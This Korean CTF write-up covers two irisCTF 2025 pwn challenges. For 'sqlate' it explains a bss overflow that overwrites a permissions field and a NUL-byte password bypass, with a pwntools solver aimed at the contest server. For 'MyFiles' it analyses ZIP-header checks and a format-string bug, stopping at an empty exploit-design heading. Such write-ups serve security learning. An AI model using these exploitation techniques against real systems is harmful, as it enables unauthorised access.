# 2025 irisCTF pwn writeup

### shielder(조수호)
### 목차

1. pwn / sqlate

- 배경
- 분석 및 익스플로잇 설계
- 솔버
- 후일담

2. pwn / MyFiles

- 배경
- 분석
- 익스플로잇 설계
- 솔버
- 후일담

---
## pwn / sqlate

- 배경

난이도 : Easy

sqlite라는 생소한 개념을 앞세웠지만 취약점은 단순한 메모리 오버플로우 문제입니다. 코드만 잘 이해하면 바로 풀 수 있습니다.

<br>
```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
Debuginfo:  Yes
```

RELRO가 Partial RELRO입니다. got overwrite가 필요한 경우 사용할 수 있습니다.

<br>
- 분석

코드가 굉장히 길기 때문에 영리한 분석이 필요합니다. 대회에서 이 문제를 풀 때 저는 플래그 출력 함수부터 역과정으로 분석하였습니다. 이 글에서는 구조체부터 정방향으로 분석하겠습니다.

<br>
```C
enum user_flags {
    permission_create = 1<<1,
    permission_update = 1<<2,
    permission_view = 1<<3,
    permission_list = 1<<4,

    permission_login = 1<<5,
    permission_register = 1<<6,

    permission_root = 1<<8,
};

struct paste {
    int rowId;
    char title[256];
    char language[256];
    char content[256];
};

struct user {
    int userId;
    uint64_t flags;
    char username[256];
    char password[256];
};

int rc;
char* errMsg;
sqlite3 *db;

char admin_password[512];
char line_buffer[512];
struct paste paste;
struct user current_user;
```

이 프로그램은 두 구조체를 정의하고 있습니다. `paste`는 글 정보를 저장하는 구조체이고, `user`는 사용자 정보를 저장하는 구조체입니다. `user_flag` 열거형은 `user`의 권한을 나타냅니다. `permission_root`가 우리가 부여해야 하는 권한입니다. `struct paste paste`와 `struct user current_user`가 인접하게 선언되어 있습니다. IDA에서도 bss 영역에 인접하게 선언되어 있음을 확인할 수 있습니다.

<br>
```C
int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    init_admin();
    login_anonymous();

    rc = sqlite3_open("paste.db", &db);
    if (rc) {
        fprintf(stderr, "Sqlite error: %s\n", sqlite3_errmsg(db));
        exit(EXIT_FAILURE);
    }

    rc = sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS entries(user INT, title TEXT, language TEXT, content BLOB)", NULL, 0, &errMsg);
    error_handle(SQLITE_OK);

    do {
        printf(
            "\n===== SQLate =====\n"
            "1) Create new Paste\n"
            "2) Update a Paste\n"
            "3) Show a Paste\n"
            "4) List all Pastes\n"
            "5) Login / Register\n"
            "6) Exit\n"
            "\n"
            "> "
        );

        const int c = fgetc(stdin);
        fgetc(stdin);

        switch (c) {
            case '1': {
                if (!check_permissions(permission_create)) continue;

                action_create();
                continue;
            }
            case '2': {
                if (!check_permissions(permission_update)) continue;

                action_update();
                continue;
            }
            case '3': {
                if (!check_permissions(permission_view)) continue;

                action_info();
                continue;
            }
            case '4': {
                if (!check_permissions(permission_list)) continue;

                action_list();
                continue;
            }
            case '5': {
                printf("Registration is currently closed.\n\n");
                action_login();
                continue;
            }
            case EOF:
            case '6':
                return 0;
            case '7': {
                if (!check_permissions(permission_root)) continue;

                action_sys();
                continue;
            }
            default: {
                printf("Unknown action %c!", c);
            }
        }
    } while(true);
}

bool check_permissions(const int perms)
{
    if ((current_user.flags & perms) != perms)
    {
        printf("You don't have permissions to perform this action!\n");
        if (current_user.userId == -1)
        {
            printf("You might need to login to unlock this.\n");
        }
        return false;
    }
    return true;
}

void action_sys()
{
    system("/usr/bin/cat flag");
}
```

`init_admin`, `login_anonymous` 와 `sqlite` 관련 함수를 실행하면서 초기 작업을 진행합니다. 그 후 저희가 실행시킬 수 있는 함수가 6개 있습니다. 각 함수를 실행시키기 위해서는 특정 권한이 필요합니다. 7번 메뉴의 `action_sys` 함수는 `flag`를 출력해주며, 사용자에게 `permission_root` 권한이 필요합니다.

<br>
```C
void login_anonymous()
{
    current_user.userId = -1;
    current_user.flags = permission_create | permission_update | permission_view | permission_list;
    strcpy(current_user.username, "anonymous");
}

void init_admin()
{
    FILE *rng = fopen("/dev/urandom", "r");
    if (rng == NULL)
        errx(EXIT_FAILURE, "Failed to open /dev/urandom");
    char *result = fgets(line_buffer, 100 * sizeof(char), rng);
    if (result == NULL)
        errx(EXIT_FAILURE, "Failed to read from /dev/urandom");
    char *pass = base64_encode(line_buffer);
    strcpy(admin_password, pass);
    free(pass);
    if (DEBUG)
    {
        printf("Generated random admin password: %s\n", admin_password);
    }
}
```

`login_anonymous` 함수에서는 사용자의 권한을 설정합니다. 사용자에게 `permission_root`은 부여되지 않습니다. `init_admin` 함수에서는 `admin_password`을 무작위 100바이트로 설정합니다. 무작위 100바이트는 엔트로피가 굉장히 크므로 무차별 대입 공격은 할 수 없습니다.

<br>
```C
void read_to_buffer(const char *description)
{
    printf("Enter %s: ", description);
    fgets(line_buffer, 256, stdin);
}


void action_create()
{
    const int default_limit = sqlite3_limit(db, SQLITE_LIMIT_LENGTH, 512);

    sqlite3_stmt *stmt;
    rc = sqlite3_prepare_v2(db, "INSERT INTO entries(title, language, content) VALUES(?, ?, ?)", -1, &stmt, 0);

    read_to_buffer("Title");
    rc = sqlite3_bind_text(stmt, 1, line_buffer, -1, SQLITE_TRANSIENT);
    error_handle(SQLITE_OK);

    read_to_buffer("Language");
    rc = sqlite3_bind_text(stmt, 2, line_buffer, -1, SQLITE_TRANSIENT);
    error_handle(SQLITE_OK);

    read_to_buffer("Content");
    rc = sqlite3_bind_text(stmt, 3, line_buffer, -1, SQLITE_TRANSIENT);
    error_handle(SQLITE_OK);

    rc = sqlite3_step(stmt);
    error_handle(SQLITE_DONE);

    rc = sqlite3_finalize(stmt);
    error_handle(SQLITE_OK);

    sqlite3_limit(db, SQLITE_LIMIT_LENGTH, default_limit);
}

void action_update()
{
    sqlite3_stmt *stmt;

    printf(
        "Which field?\n"
        "1) Language\n"
        "2) Content\n"
        "\n"
        ">");

    int c = getc(stdin);
    getc(stdin);

    if (c != '1' && c != '2')
        return;
    const char *field = c == '1' ? "language" : "content";

    if (c == '2')
    {
        printf(
            "Which modifier?\n"
            "1) None\n"
            "2) Hex\n"
            "3) Base64\n"
            "\n"
            ">");

        c = getc(stdin);
        getc(stdin);

        read_to_buffer(field);

        if (c == '1' || c == '3')
        {
            rc = sqlite3_prepare_v2(db, "UPDATE entries SET content=? WHERE title = ?", -1, &stmt, 0);
        }
        else if (c == '2')
        {
            rc = sqlite3_prepare_v2(db, "UPDATE entries SET content=HEX(?) WHERE title = ?", -1, &stmt, 0);
        }
        else
        {
            printf("Invalid choice\n");
            return;
        }

        if (c == '3')
        {
            char *temp = base64_encode(line_buffer);
            if (strlen(temp) > 255)
                err(EXIT_FAILURE, "Attempted to overflow!");
            strcpy(line_buffer, temp);
            free(temp);
        }
        else if (c == '2')
        {
            if (strlen(line_buffer) > 192)
                err(EXIT_FAILURE, "Attempted to overflow!");
        }
    }
    else
    {
        rc = sqlite3_prepare_v2(db, "UPDATE entries SET language=? WHERE title = ?", -1, &stmt, 0);
    }
    error_handle(SQLITE_OK);

    rc = sqlite3_bind_text(stmt, 1, line_buffer, -1, SQLITE_TRANSIENT);
    error_handle(SQLITE_OK);

    read_to_buffer("Title");
    rc = sqlite3_bind_text(stmt, 2, line_buffer, -1, SQLITE_TRANSIENT);
    error_handle(SQLITE_OK);
    printf("'%s'\n", line_buffer);

    rc = sqlite3_step(stmt);
    error_handle(SQLITE_DONE);
}
```

`read_to_buffer`는 단순히 입력을 받는 함수입니다. `action_create` 함수는 글에 대한 정보를 입력받고 `sql`에 저장합니다. `action_update` 함수는 `sql`에 있는 글의 정보를 갱신할 수 있습니다. `language` 영역 갱신은 특이한 내용이 없습니다. `content` 영역 갱신은, `None`, `base64`, `hex`의 형식으로 할 수 있습니다. 이때 `hex`를 처리하기 전 입력 길이의 제한이 192바이트이므로 `hex` 처리하면 384바이트가 됩니다.

<br>
```C
void print_paste(struct paste *paste)
{
    printf("===== Paste %d =====\n", paste->rowId);
    printf("Title: %s", paste->title);
    printf("Language: %s", paste->language);
    printf("Content: \n%s", paste->content);
    printf("\n\n");
}

void action_list()
{
    sqlite3_stmt *stmt;
    rc = sqlite3_prepare_v2(db, "SELECT rowid, title, language, content FROM entries", -1, &stmt, 0);
    error_handle(SQLITE_OK);

    rc = sqlite3_step(stmt);
    if (rc == SQLITE_DONE)
    {
        printf("You don't have any pastes right now.\n");
        sqlite3_finalize(stmt);
        return;
    }
    error_handle(SQLITE_ROW);

    while (rc == SQLITE_ROW)
    {
        paste.rowId = sqlite3_column_int(stmt, 0);

        const char *title = (const char *)sqlite3_column_text(stmt, 1);
        const char *language = (const char *)sqlite3_column_text(stmt, 2);
        const char *content = (const char *)sqlite3_column_text(stmt, 3);

        strncpy(paste.title, title ? title : "", sizeof(paste.title) - 1);
        paste.title[sizeof(paste.title) - 1] = '\0';

        strncpy(paste.language, language ? language : "", sizeof(paste.language) - 1);
        paste.language[sizeof(paste.language) - 1] = '\0';

        strncpy(paste.content, content ? content : "", sizeof(paste.content) - 1);
        paste.content[sizeof(paste.content) - 1] = '\0';

        print_paste(&paste);

        rc = sqlite3_step(stmt);
    }

    rc = sqlite3_finalize(stmt);
    error_handle(SQLITE_OK);
}
```

`action_list`는 `sql`에 있던 글들을 `paste`에 옮겨 `print_paste` 함수를 통해 출력합니다. 이 때 `content` 영역의 내용이 위의 `action_update` 함수에 의해 최대 384바이트가 되어 메모리 오버플로우(memory overflow)가 발생합니다. `paste`와 `current_user`가 붙어있기 때문에 `current_user`의 flag를 덮을 수 있습니다. 이렇게 사용자에게 `permission_root`를 부여하고 `flag`를 읽습니다.

<br>
- 솔버

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./vuln')
p = remote('sqlate.chal.irisc.tf', 10000)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'csh')
p.sendlineafter(b': ', b'csh')
p.sendlineafter(b': ', b'csh')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'2')
p.sendlineafter(b': ', b'\xfe' * 192 + b'\x00')
p.sendlineafter(b': ', b'csh')
p.sendlineafter(b'>', b'4')
p.sendlineafter(b'>', b'7')
p.interactive()
```

<br>
- 후일담

```C
void action_login()
{
    // Currently only admin login
    read_to_buffer("Password?");
    unsigned long length = strlen(line_buffer);
    for (unsigned long i = 0; i < length && i < 512; i++)
    {
        if (line_buffer[i] != admin_password[i])
        {
            printf("Wrong password!\n");
            return;
        }
    }

    strcpy(current_user.username, "admin");
    current_user.userId = 0;
    current_user.flags = 0xFFFFFFFF;
}
```

`action_login`에서 관리자 권한을 부여받을 수 있습니다. `admin_password`는 위에서 말씀드린 대로 엔트로피가 크지만, for문이 `strlen(line_buffer)`를 기준으로 작동하고 있습니다. 따라서 첫 바이트를 `NULL`로 입력하면 검증 없이 관리자 권한을 부여받습니다.
이 풀이가 저의 기존 풀이보다 훨씬 간단합니다. 물론 문제가 쉬워서 어떻게 풀든 금방 풀었겠지만, 취약점이 하나 보여서 다른 취약점은 생각 안 하고 익스한 점이 악수인 거 같습니다.

---

## pwn / MyFiles

- 배경

난이도 : Med - Hard

코드를 보면 취약점 하나가 쉽게 보이지만 첫 단추를 발견하기 쉽지 않습니다. zip 파일 조작이 아니면 순수 바이너리로만은 익스할 수 없기 때문에 발상의 전환이 없으면 풀기 힘든 문제입니다.

<br>
```bash
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

모든 보호기법이 적용되어 있습니다.

<br>
- 분석

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setupUsers();
  puts("Welcome to MyFiles 2K, where we store your files as secure ZIPs.");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. List users");
      puts("2. List files");
      puts("3. Create user");
      puts("4. Upload file");
      puts("5. View file");
      puts("6. Get flag");
      puts("7. Exit");
      printf("> ");
      if ( (unsigned int)__isoc99_scanf("%d", &v4) == 1 && v4 > 0 && v4 <= 7 )
        break;
      puts("Bad choice");
      getchar();
    }
    putchar(10);
    switch ( v4 )
    {
      case 1:
        listUsers();
        goto LABEL_20;
      case 2:
        listFiles();
        goto LABEL_20;
      case 3:
        createUser();
        goto LABEL_20;
      case 4:
        uploadFile();
        goto LABEL_20;
      case 5:
        viewFile();
        goto LABEL_20;
      case 6:
        viewFlag();
        goto LABEL_20;
    }
    if ( v4 == 7 )
      break;
LABEL_20:
    putchar(10);
  }
  puts("Bye");
  return 0;
}
```

`setupUsers` 함수 실행 후에 6가지 메뉴가 있는 반복문이 작동합니다.

<br>
```C
size_t __fastcall readFile(void *a1, const char *a2, int a3)
{
  __int64 n; // [rsp+28h] [rbp-18h]
  FILE *stream; // [rsp+30h] [rbp-10h]
  size_t v7; // [rsp+38h] [rbp-8h]

  stream = fopen(a2, "rb");
  if ( !stream )
    return 0xFFFFFFFFLL;
  fseek(stream, 0LL, 2);
  n = ftell(stream);
  fseek(stream, 0LL, 0);
  if ( n > a3 )
    n = a3;
  v7 = fread(a1, 1uLL, n, stream);
  fclose(stream);
  if ( v7 == n )
    return v7;
  else
    return 0xFFFFFFFFLL;
}

unsigned __int64 setupUsers()
{
  int i; // [rsp+Ch] [rbp-C4h]
  int j; // [rsp+10h] [rbp-C0h]
  int k; // [rsp+14h] [rbp-BCh]
  int m; // [rsp+18h] [rbp-B8h]
  FILE *stream; // [rsp+20h] [rbp-B0h]
  char *v6; // [rsp+38h] [rbp-98h]
  char ptr[64]; // [rsp+40h] [rbp-90h] BYREF
  char s[72]; // [rsp+80h] [rbp-50h] BYREF
  unsigned __int64 v9; // [rsp+C8h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  for ( i = 0; i <= 15; ++i )
  {
    v6 = (char *)&fileUsers + 132120 * i;
    *(_QWORD *)v6 = 0LL;
    *((_QWORD *)v6 + 1) = 0LL;
    *((_DWORD *)v6 + 5) = 0;
  }
  for ( j = 0; j <= 15; ++j )
  {
    for ( k = 0; k <= 255; ++k )
      *((_DWORD *)&unk_5058 + 33030 * j + 129 * k) = -1;
  }
  stream = fopen("/dev/urandom", "r");
  if ( !stream )
    exit(1);
  fread(ptr, 0x3FuLL, 1uLL, stream);
  s[63] = -1;
  for ( m = 0; m <= 62; ++m )
    s[m] = (unsigned __int8)ptr[m] % 0xAu + 48;
  fclose(stream);
  unk_1E8DA8 = "Tom";
  *((_QWORD *)&unk_1E8DA8 + 1) = strdup(s);
  *((_DWORD *)&unk_1E8DA8 + 4) = 1;
  *((_DWORD *)&unk_1E8DA8 + 5) = 1;
  *((_DWORD *)&unk_1E8DA8 + 6) = readFile((char *)&unk_1E8DA8 + 28, "invite.zip", 512);
  return __readfsqword(0x28u) ^ v9;
}

__int64 askUserAndPass()
{
  unsigned int v1; // [rsp+4h] [rbp-4Ch] BYREF
  __int64 v2; // [rsp+8h] [rbp-48h]
  char s2[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("User id? ");
  if ( (unsigned int)__isoc99_scanf("%d", &v1) == 1 && v1 <= 0xF && *((_QWORD *)&fileUsers + 16515 * (int)v1) )
  {
    v2 = (__int64)&fileUsers + 132120 * (int)v1;
    s2[49] = 0;
    printf("Password? ");
    __isoc99_scanf("%49s", s2);
    if ( !strcmp(*(const char **)(v2 + 8), s2) )
    {
      return v2;
    }
    else
    {
      puts("Incorrect password");
      return 0LL;
    }
  }
  else
  {
    puts("Bad user id");
    return 0LL;
  }
}
```

`setupUsers` 함수에서는 `fileUsers` 데이터를 초기화합니다. 15번 인덱스에 `Tom` 사용자 정보를 쓰고, `readFile` 함수를 통해 `invite.zip` 파일을 읽고 저장합니다. `invite.zip` 내부의 `invitecode.txt`에는 `invitecode`가 있습니다. 직접 계산해본 결과, `fileUsers` 데이터 영역에 memory overflow 취약점은 없습니다. `askUserAndPass` 함수는 메뉴에 있는 많은 함수의 기초 함수로, 검증을 요청하는 사용자의 비밀번호를 알고 있는지를 확인합니다.

<br>
```C
int listUsers()
{
  __int64 v0; // rax
  int i; // [rsp+4h] [rbp-Ch]

  for ( i = 0; i <= 15; ++i )
  {
    v0 = *((_QWORD *)&fileUsers + 16515 * i);
    if ( v0 )
      LODWORD(v0) = printf("[UID=%d] %s\n", (unsigned int)i, *((const char **)&fileUsers + 16515 * i));
  }
  return v0;
}

unsigned __int64 listFiles()
{
  unsigned int v1; // [rsp+8h] [rbp-48h] BYREF
  unsigned int i; // [rsp+Ch] [rbp-44h]
  __int64 v3; // [rsp+10h] [rbp-40h]
  int *v4; // [rsp+18h] [rbp-38h]
  const char *v5; // [rsp+20h] [rbp-30h] BYREF
  unsigned int v6; // [rsp+28h] [rbp-28h]
  __int64 v7; // [rsp+30h] [rbp-20h]
  unsigned __int64 v8; // [rsp+48h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  printf("For which user id? ");
  if ( (unsigned int)__isoc99_scanf("%d", &v1) == 1 && v1 <= 0xF && *((_QWORD *)&fileUsers + 16515 * (int)v1) )
  {
    v3 = (__int64)&fileUsers + 132120 * (int)v1;
    for ( i = 0; (signed int)i < *(_DWORD *)(v3 + 20); ++i )
    {
      v4 = (int *)(516LL * (int)i + 16 + v3 + 8);
      if ( *v4 >= 0 && (unsigned __int8)readZipInfo((__int64)&v5, (__int64)(v4 + 1), *v4) )
        printf("[FID=%d] %s %d %llx\n", i, v5, v6, v7);
    }
  }
  else
  {
    puts("Bad user id");
  }
  return __readfsqword(0x28u) ^ v8;
}
```

`listUsers` 함수에서는 현재 등록된 사용자 목록을 보여줍니다. `listFiles` 함수는 사용자 id를 입력받고 해당 사용자에 등록되어 있는 파일 목록을 보여줍니다. 유효한 사용자 id 체크를 진행하며, 후의 모든 함수에서도 이 부분에 대한 취약점은 없습니다.

<br>
```C
bool __fastcall checkInvite(const void *a1)
{
  char v2[8]; // [rsp+30h] [rbp-30h] BYREF
  int v3; // [rsp+38h] [rbp-28h]
  int v4; // [rsp+48h] [rbp-18h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( (unsigned __int8)readZipInfo((__int64)v2, (__int64)&dword_1E8DC0[1], dword_1E8DC0[0]) == 1 )
    return memcmp((char *)&dword_1E8DC0[1] + v4, a1, v3) == 0;
  puts("Invalid zip");
  return 0;
}

unsigned __int64 createUser()
{
  int i; // [rsp+4h] [rbp-CCh]
  char *v2; // [rsp+8h] [rbp-C8h]
  char v3[64]; // [rsp+10h] [rbp-C0h] BYREF
  char s[64]; // [rsp+50h] [rbp-80h] BYREF
  char v5[56]; // [rsp+90h] [rbp-40h] BYREF
  unsigned __int64 v6; // [rsp+C8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = 0; ; ++i )
  {
    if ( i > 15 )
    {
      puts("Max number of users already created");
      return __readfsqword(0x28u) ^ v6;
    }
    v2 = (char *)&fileUsers + 132120 * i;
    if ( !*(_QWORD *)v2 )
      break;
  }
  v3[49] = 0;
  s[49] = 0;
  v5[49] = 0;
  printf("Invite code? ");
  __isoc99_scanf("%49s", v3);
  if ( !checkInvite(v3) )
  {
    puts("Invalid invite code");
  }
  else
  {
    printf("Username? ");
    __isoc99_scanf("%49s", s);
    *(_QWORD *)v2 = strdup(s);
    printf("Password? ");
    __isoc99_scanf("%49s", v5);
    *((_QWORD *)v2 + 1) = strdup(v5);
    printf("[UID=%d] %s\n", (unsigned int)i, *(const char **)v2);
  }
  return __readfsqword(0x28u) ^ v6;
}
```

`createUser` 함수는 새로운 사용자를 등록합니다. 이 때 `checkInvite` 함수를 통과해야 합니다. `readZipinfo` 함수는 뒤에서 자세히 설명하겠으며, `checkInvite` 함수에서는 `Tom`의 `invite.zip`의 `invitecode.txt`, 즉 `invitecode`를 읽습니다. 따라서 `invitecode`를 모르면 사용자를 추가할 수 없습니다.

<br>
```C
__int64 __fastcall readHex(__int64 a1, __int64 a2, int a3)
{
  int v3; // eax
  int v5; // eax
  int v6; // ebx
  int v7; // eax
  char v8; // cl
  int v9; // eax
  char v11; // [rsp+26h] [rbp-1Ah]
  char v12; // [rsp+27h] [rbp-19h]
  unsigned int v13; // [rsp+28h] [rbp-18h]
  int v14; // [rsp+2Ch] [rbp-14h]

  v13 = 0;
  v14 = 0;
  while ( v14 < a3 )
  {
    v3 = v14++;
    v11 = *(_BYTE *)(v3 + a2);
    if ( v11 != 32 )
    {
      if ( ((*__ctype_b_loc())[v11] & 0x1000) == 0 )
        return 0xFFFFFFFFLL;
      if ( v14 >= a3 )
        return 0xFFFFFFFFLL;
      v5 = v14++;
      v12 = *(_BYTE *)(v5 + a2);
      if ( ((*__ctype_b_loc())[v12] & 0x1000) == 0 )
        return 0xFFFFFFFFLL;
      if ( ((*__ctype_b_loc())[v11] & 0x800) != 0 )
        LOBYTE(v6) = 16 * (v11 - 48);
      else
        v6 = 16 * (toupper(v11) - 55);
      if ( ((*__ctype_b_loc())[v12] & 0x800) != 0 )
        LOBYTE(v7) = v12 - 48;
      else
        v7 = toupper(v12) - 55;
      v8 = v7 | v6;
      v9 = v13++;
      *(_BYTE *)(v9 + a1) = v8;
    }
  }
  return v13;
}

__int64 __fastcall hash(__int64 a1, int a2)
{
  int v2; // eax
  int i; // [rsp+10h] [rbp-Ch]
  __int64 v5; // [rsp+14h] [rbp-8h]

  v5 = 0xCBF29CE484222325LL;
  for ( i = 0; i < a2; ++i )
  {
    v2 = i;
    v5 = 0x100000001B3LL * (*(unsigned __int8 *)(v2 + a1) ^ (unsigned __int64)v5);
  }
  return v5;
}

__int64 __fastcall readZipInfo(__int64 a1, __int64 a2, int a3)
{
  int i; // [rsp+28h] [rbp-18h]
  int v6; // [rsp+2Ch] [rbp-14h]
  _DWORD *v7; // [rsp+38h] [rbp-8h]

  v7 = (_DWORD *)(a2 + 26);
  if ( *(_DWORD *)a2 == 67324752 )
  {
    if ( *(_WORD *)(a2 + 8) )
    {
      puts("Only uncompressed files are supported");
      return 0LL;
    }
    else
    {
      v6 = *v7;
      if ( v6 == (__int16)v6 )
      {
        if ( a3 - 25 > (__int16)v6 )
        {
          *(_QWORD *)a1 = calloc(1uLL, 0x200uLL);
          for ( i = 0; i < (__int16)v6; ++i )
            *(_BYTE *)(i + *(_QWORD *)a1) = *((_BYTE *)v7 + i + 4);
          if ( *(unsigned int *)(a2 + 18) <= (unsigned __int64)(a3 - (__int64)(__int16)v6 - 30) )
          {
            if ( *(_DWORD *)(a2 + 18) > 9u )
            {
              *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 18);
              *(_DWORD *)(a1 + 24) = (__int16)v6 + 30;
              *(_QWORD *)(a1 + 16) = hash((__int64)v7 + (__int16)v6 + 4, *(_DWORD *)(a2 + 18));
              return 1LL;
            }
            else
            {
              puts("There is no reason to upload a file this small :(");
              return 0LL;
            }
          }
          else
          {
            puts("File data length too long");
            return 0LL;
          }
        }
        else
        {
          printf("File name length too long (assert %d > %d)\n", (unsigned int)(__int16)v6, a3 - 26LL);
          return 0LL;
        }
      }
      else
      {
        puts("Extra field not supported");
        return 0LL;
      }
    }
  }
  else
  {
    puts("ZIP magic expected");
    return 0LL;
  }
}

unsigned __int64 uploadFile()
{
  int v0; // eax
  unsigned int v2; // [rsp+4h] [rbp-44Ch] BYREF
  int v3; // [rsp+8h] [rbp-448h]
  int Hex; // [rsp+Ch] [rbp-444h]
  __int64 v5; // [rsp+10h] [rbp-440h]
  int *v6; // [rsp+18h] [rbp-438h]
  char v7[32]; // [rsp+20h] [rbp-430h] BYREF
  char s[1032]; // [rsp+40h] [rbp-410h] BYREF
  unsigned __int64 v9; // [rsp+448h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  printf("Which user id do you want to upload this file to? ");
  if ( (unsigned int)__isoc99_scanf("%d", &v2) == 1 && v2 <= 0xF && *((_QWORD *)&fileUsers + 16515 * (int)v2) )
  {
    v5 = (__int64)&fileUsers + 132120 * (int)v2;
    v3 = *(_DWORD *)(v5 + 20);
    if ( v3 <= 255 )
    {
      v6 = (int *)(516LL * v3 + 16 + v5 + 8);
      s[1023] = 0;
      puts("Paste the hex of a zip file (less than 512 bytes)");
      puts("The zip file must only contain one uncompressed file");
      __isoc99_scanf("%1023s", s);
      v0 = strlen(s);
      Hex = readHex((__int64)(v6 + 1), (__int64)s, v0);
      if ( Hex >= 0 )
      {
        *v6 = Hex;
        if ( (unsigned __int8)readZipInfo((__int64)v7, (__int64)(v6 + 1), *v6) != 1 )
        {
          puts("Invalid zip");
        }
        else
        {
          ++*(_DWORD *)(v5 + 20);
          puts("File created");
        }
      }
      else
      {
        puts("Invalid hex");
      }
    }
    else
    {
      puts("Max number of files already created");
    }
  }
  else
  {
    puts("Bad user id");
  }
  return __readfsqword(0x28u) ^ v9;
}
```

`uploadFile`은 지정된 사용자 영역에 파일을 업로드하는 함수입니다. 사용자 id에 대한 입력 검증이 존재합니다. `readHex` 함수를 통해 zip 파일을 바이너리의 Hex 형태로 입력받습니다. 그 후 `readZipInfo` 함수에서 zip 파일 데이터를 검증합니다. zip 파일 Header 구성을 보며 검증 부분을 자세히 분석하겠습니다.

<br>
![[Pasted image 20250213193901.png]]

`readZipInfo` 함수에 zip 파일을 등록하기 위한 조건문이 6개 있습니다.

1. `if ( *(_DWORD *)a2 == 67324752 )` : zip 파일의 시그니처를 확인합니다. 항상 `\x50\x4b\x03\x04`입니다.
2. `if ( *(_WORD *)(a2 + 8) )` : zip 파일의 압축률이 0인지 확인합니다. 압축할 때 `-0` 옵션을 주는 것으로 조건을 만족할 수 있습니다.
3.  `v7 = (_DWORD *)(a2 + 26); v6 = *v7; if ( v6 == (__int16)v6 )` : `Extra field len`이 0인지 확인합니다.
4. `if ( a3 - 25 > (__int16)v6 )` : 파일 이름이 비정상적으로 긴지 확인합니다.
5. `if ( *(unsigned int *)(a2 + 18) <= (unsigned __int64)(a3 - (__int64)(__int16)v6 - 30) )` : 파일 내용 크기가 비정상적으로 큰지 확인합니다. 전체 파일 크기에서 `파일 이름 길이 + 상수값`과 비교하므로 상식적인 비교라고 볼 수 있습니다.
6. `if ( *(_DWORD *)(a2 + 18) > 9u )` : 파일 내용 크기가 10바이트가 이상인 경우만 업로드할 수 있습니다.

이 모든 조건을 통과하면 파일을 저장하는데, 압축 대상 파일(예를 들어 `invite.zip`의 `invitecode.txt`)의 내용을 `hash` 함수(`FNV-1`, 복호화할 수 없는 해시 기법이다.)를 이용하여 해시화하여 같이 저장합니다. 이 해시값은 `listFiles` 함수에서 볼 수 있는 내용입니다.

<br>
```C
unsigned __int64 viewFile()
{
  __int64 v0; // rax
  unsigned int v2; // [rsp+8h] [rbp-248h] BYREF
  unsigned int v3; // [rsp+Ch] [rbp-244h]
  __int64 v4; // [rsp+10h] [rbp-240h]
  __int64 v5; // [rsp+18h] [rbp-238h]
  char v6[8]; // [rsp+20h] [rbp-230h] BYREF
  unsigned int v7; // [rsp+28h] [rbp-228h]
  int v8; // [rsp+38h] [rbp-218h]
  char dest[520]; // [rsp+40h] [rbp-210h] BYREF
  unsigned __int64 v10; // [rsp+248h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v4 = askUserAndPass();
  if ( v4 )
  {
    printf("Which file id do you want to contents of? ");
    if ( (unsigned int)__isoc99_scanf("%d", &v2) == 1 && v2 <= 0xFF && *(_DWORD *)(v4 + 516LL * (int)v2 + 24) != -1 )
    {
      v0 = 516LL * (int)v2 + 16 + v4;
      v5 = v0 + 8;
      if ( (unsigned __int8)readZipInfo((__int64)v6, v0 + 12, *(_DWORD *)(v0 + 8)) != 1 )
      {
        puts("Invalid zip");
      }
      else
      {
        v3 = v7;
        if ( v7 > 0x1FE )
          v3 = 511;
        memcpy(dest, (const void *)(v8 + v5 + 4), (int)v3);
        dest[v3] = 0;
        printf(dest);
      }
    }
    else
    {
      puts("Bad file id");
    }
  }
  return __readfsqword(0x28u) ^ v10;
}

unsigned __int64 viewFlag()
{
  __int64 v1; // [rsp+8h] [rbp-98h]
  char v2[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v3; // [rsp+98h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = askUserAndPass();
  if ( v1 )
  {
    if ( *(_DWORD *)(v1 + 16) )
    {
      v2[(int)readFile(v2, "flag.txt", 127)] = 0;
      printf("Flag: %s\n", v2);
    }
    else
    {
      puts("Not admin.");
    }
  }
  return __readfsqword(0x28u) ^ v3;
}
```

`viewFile` 함수에서는 `askUserAndPass` 함수를 통과한 사용자에 있는 파일을 읽을 수 있습니다. 이 때 `FSB` 취약점이 있음을 알 수 있습니다. `viewFlag` 함수에서는 `askUserAndPass` 함수로 `admin` 권한이 있는 사용자를 인증하면 flag를 얻을 수 있습니다. `setupUsers` 함수를 보면 `admin` 권한은 `Tom`에게 있으며, `createUser` 함수도 참고하면 `admin` 권한은 다른 사용자에게는 부여되지 않음을 알 수 있습니다.

<br>
- 익스플로잇 설계

